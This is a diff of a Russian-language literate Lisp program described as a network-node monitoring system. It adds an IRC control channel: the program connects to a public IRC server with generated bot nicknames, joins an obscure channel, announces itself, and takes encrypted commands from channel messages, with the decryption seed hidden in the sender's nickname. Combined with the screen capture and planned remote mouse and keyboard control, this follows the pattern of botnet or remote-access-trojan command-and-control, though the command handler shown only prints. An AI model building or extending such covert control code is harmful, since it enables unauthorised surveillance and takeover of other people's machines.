@@ -3,47 +3,159 @@
 * Intro
 
 Это внешняя система мониторинга, предназначеная для наблюдения за работой
-узла сети. Она отслеживает изменения экрана и некоторых файлов,
-упаковывает их и отсылает управляющему серверу.
+узла сети. Узел сети может быть не только desktop-системой, но и сервером
+умного дома и осуществлять управление его компонентами: включать и
+выключать нагрузку, отправлять команды роботу пылесосу, и.т.п.
+
+К сожалению, некоторые проприетарные компоненты автоматизации, такие как
+3D-принтер, могут управляться только через GUI своей управляющей
+программы. Поэтому для того чтобы удаленно управлять ими необходимо
+анализировать скриншоты экрана и осуществлять операции виртуальной мышью
+и клавиатурой над управляющей программой.
+
+Поэтому мы должны отслеживать изменения на экране, отпралять их в
+коммуникационный канал (естественно не в открытом виде) и иметь
+возможность проанализировать их удаленно, а потом отослать команду,
+которая будет выполнена.
 
 Наша основная задача - сократить количество передаваемых данных, потому
 что узлов сети может быть множество и не все из них имеют быстрые каналы
-передачи. Поэтому мы используем множество различных трюков для этого.
+передачи.
 
-* Process
+* IRC
 
-Наша задача состоит в том, чтобы:
-- Осуществлять мониторинг
-  - Делать снимок экрана один раз в секунду (или другой временной интервал)
-  - Сравнивать его с предыдущим снимком экрана
-  - Если нашлись различия - кодировать эти различия и отправлять их
-  - Если различий нет - использовать освободившуюся полосу пропускания
-    канала чтобы отправить больше данных уточняющих предыдущее состояние
-- Запрашивать команды
-  - Если команды есть выполнять их и отсылать отчет о выполнении
+Работа с IRC состоит из нескольких этапов
+- Подключение
+- Запуск цикла чтения сообщений (в отдельном потоке)
+- Установка хука, чтобы перехватить сообщения-команды
+- Подключение к каналу и отправка первого сообщения
 
-Для того чтобы справиться со всем этим мы будем использовать систему,
-построенную на очередях, потоках и таймерах. Нам также придется
-реализовать компактные форматы для передачи данных.
+#+NAME: irc
+#+BEGIN_SRC lisp :noweb yes
+  <<irc_conn>>
+  <<irc_loop>>
+  <<irc_hook>>
+  <<irc_join>>
+#+END_SRC
 
-Пайплайн обработки следующий:
-- Основной поток запускает таймер в котором будет произведен вызов
-  процедуры скриншота.
-- Процедура скриншота делает скриншот и кладет его в очередь
-  скриншотов. После этого она сигнализирует о новом скриншоте всем, кто
-  подписан на ее сообщения. После этого она реинициализирует свой таймер,
-  чтобы перезапуститься через интервал задержки. Этот интервал
-  динамически перестраивается в зависимости от загрузки.
-- Процедура обработки получает сообщения и обрабатывает данные, передавая
-  их процедуре отправки с помощью такого-же механизма
-- Процедура отправки отправляет данные.
-- Процедура получения команд асинхронно обрабатывает команды по мере их
-  поступления.
+** Connect
+
+Начнем с подключения к IRC - нашему коммуникационному каналу.
+
+В случае если по какой-то причине мы не можем подключиться - то вызываем
+процедуру подключения хвосторекурсивно каждые три секунды. Пока
+подключиться не удастся мы все равно ничего не можем сделать.
+
+#+NAME: irc_conn
+#+BEGIN_SRC lisp :noweb yes
+  (defparameter *irc-sess* (get-universal-time))
+  (defparameter *irc-user* (format nil "b~A" *irc-sess*))
+  (defparameter *irc-serv* "irc.freenode.org")
+  (defparameter *irc-chan* "#nvrtlessfndout")
+  (defparameter *irc-lock* (bt:make-lock "irc-lock"))
+
+  (defun try-irc-conn ()
+    (let ((conn (handler-case
+                    (cl-irc:connect :nickname *irc-user* :server *irc-serv*)
+                  (USOCKET:NS-TRY-AGAIN-CONDITION () nil))))
+      (if conn
+          conn
+          (progn
+            (sleep 3)
+            (try-irc-conn)))))
+
+  (defparameter *irc-conn* (try-irc-conn))
+#+END_SRC
+
+** Read loop
+
+#+NAME: irc_loop
+#+BEGIN_SRC lisp :noweb yes
+  (defun irc-loop ()
+    (cl-irc:read-message-loop *irc-conn*))
+
+  (defparameter *irc-thread*
+    (bt:make-thread (lambda ()
+                      (irc-loop))
+                    :name "irc-thread"
+                    :initial-bindings
+                    `((*standard-output* . ,*standard-output*)
+                      (*irc-user* . ,*irc-user*)
+                      (*irc-serv* . ,*irc-serv*)
+                      (*irc-chan* . ,*irc-chan*)
+                      (*irc-conn* . ,*irc-conn*))))
+#+END_SRC
+
+** Command hook
+
+Функция, которая читает сообщения из канала должна быть запущена в
+отдельном потоке. При получении команды она вызовет хук, который должен
+исполнить эту команду (command processor).
+
+#+NAME: irc_hook
+#+BEGIN_SRC lisp :noweb yes
+  ;; irc_cmd_proc
+  <<irc_cmd_proc>>
+
+  (defun irc-msg-hook (param)
+    "MUST return T for stop hooks processing"
+    (funcall *irc-cmd* param)
+    t)
+#+END_SRC
+
+У сообщения есть следующие поля:
+- CL-IRC:SOURCE
+- CL-IRC:USER
+- CL-IRC:HOST
+- CL-IRC:COMMAND
+- CL-IRC:ARGUMENTS
+- CL-IRC:CONNECTION
+- CL-IRC:RECEIVED-TIME
+- CL-IRC:RAW-MESSAGE-STRING
+
+Из них нас интересует собственно команда размещенная в ~ARGUMENTS~ и имя
+пользователя из ~SOURCE~. Имя пользователя будет содержать
+инициализационный вектор для регистра с линейной обратной связью, который
+даст нам гамму для расшифровки команды.
+
+#+NAME: irc_cmd_proc
+#+BEGIN_SRC lisp
+  (defparameter *irc-cmd*
+    (lambda (param)
+      (block irc-cmd-block
+        (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
+               (src (CL-IRC:SOURCE param))
+               (vec (handler-case (parse-integer (subseq src 1))
+                      (SB-INT:SIMPLE-PARSE-ERROR ()
+                        (return-from irc-cmd-block nil)))))
+          (format t "~%::COMMAND::~A::" msg)
+          (format t "~%::SOURCE::~A::" src)
+          (format t "~%::VEC::~A::" vec))
+        (finish-output))))
+#+END_SRC
+
+** Join to channel
+
+После того как мы запустили цикл чтения сообщений можно подключаться к
+каналу и отправить сообщение о присутствии.
+
+#+NAME: irc_join
+#+BEGIN_SRC lisp :noweb yes
+  (defun irc-join ()
+    (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
+    (sleep 3)
+    (bt:with-lock-held (*irc-lock*)
+      (cl-irc:join *irc-conn* *irc-chan*))
+    (sleep 3)
+    (bt:with-lock-held (*irc-lock*)
+      (cl-irc:privmsg
+       ,*irc-conn* *irc-chan*
+       (format nil "nfo:start"))))
+
+  (irc-join)
+#+END_SRC
 
 * Base
-
-Начнем с создания основным потоком таймера, который будет запускать
-процедуру скриншота. После создания запланируем этот таймер
 
 #+NAME: base
 #+BEGIN_SRC lisp :noweb yes
@@ -56,68 +168,6 @@
                     (shot-func))
                 :name "shot" :thread t))
 
-  (defparameter *irc-user* (format nil "sham_~A" (get-universal-time)))
-  (defparameter *irc-serv* "irc.freenode.org")
-  (defparameter *irc-chan* "#nvrtlessfndout")
-  (defparameter *irc-lock* (bt:make-lock "irc-lock"))
-
-  (defparameter *irc-conn*
-    (cl-irc:connect :nickname *irc-user* :server *irc-serv*))
-
-  (defun irc-func ()
-    (cl-irc:read-message-loop *irc-conn*))
-
-  (defparameter *irc-thread*
-    (bt:make-thread (lambda ()
-                      (irc-func))
-                    :name "irc-thread"
-                    :initial-bindings
-                    `((*standard-output* . ,*standard-output*)
-                      (*irc-user* . ,*irc-user*)
-                      (*irc-serv* . ,*irc-serv*)
-                      (*irc-chan* . ,*irc-chan*)
-                      (*irc-conn* . ,*irc-conn*))))
-
-  ;; get all slots by class name
-  ;; (ql:quickload "closer-mop")
-  ;; (mapcar #'closer-mop:slot-definition-name
-  ;;         (closer-mop:class-slots
-  ;;          (find-class 'cl-irc:IRC-PRIVMSG-MESSAGE)))
-
-  (defparameter *irc-cmd*
-    (lambda (param)
-      ;; (format t "~%<:3333[~A]:>~%" param)
-      ;; (format t "~A: ~A" "CL-IRC:SOURCE" (CL-IRC:SOURCE param))
-      ;; (format t "~%~A: ~A" "CL-IRC:USER" (CL-IRC:USER param))
-      ;; (format t "~%~A:~A" "CL-IRC:HOST" (CL-IRC:HOST param))
-      ;; (format t "~%~A:  ~A" "CL-IRC:COMMAND" (CL-IRC:COMMAND param))
-      ;; (format t "~%~A: ~A" "CL-IRC:ARGUMENTS" (CL-IRC:ARGUMENTS param))
-      ;; (format t "~%~A: ~A" "CL-IRC:CONNECTION" (CL-IRC:CONNECTION param))
-      ;; (format t "~%~A: ~A" "CL-IRC:RECEIVED-TIME" (CL-IRC:RECEIVED-TIME param))
-      ;; (format t "~%---------------")
-      ;; (format t "~%~A:~A" "CL-IRC:RAW-MESSAGE-STRING"
-      ;;         (CL-IRC:RAW-MESSAGE-STRING param))
-      ;; (format t "~%===================")
-      (let ((msg (cadr (CL-IRC:ARGUMENTS param))))
-        (format t "~%::COMMAND::~A::" msg))
-      (finish-output)))
-
-  (defun irc-msg-hook (param)
-    "MUST return T for stop hooks processing"
-    (funcall *irc-cmd* param)
-    t)
-
-  (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
-
-  (sleep 3)
-
-  (bt:with-lock-held (*irc-lock*)
-    (cl-irc:join *irc-conn* *irc-chan*))
-
-  (sleep 3)
-
-  (bt:with-lock-held (*irc-lock*)
-    (cl-irc:privmsg *irc-conn* *irc-chan* "start"))
 
   ;; (schedule-timer *shot-timer* 0.5)
 #+END_SRC
@@ -770,5 +820,6 @@ SIMD-операций.
   <<make_bit_image>>
   <<pack_image>>
 
-  <<base>>
+  ;; <<base>>
+  <<irc>>
 #+END_SRC
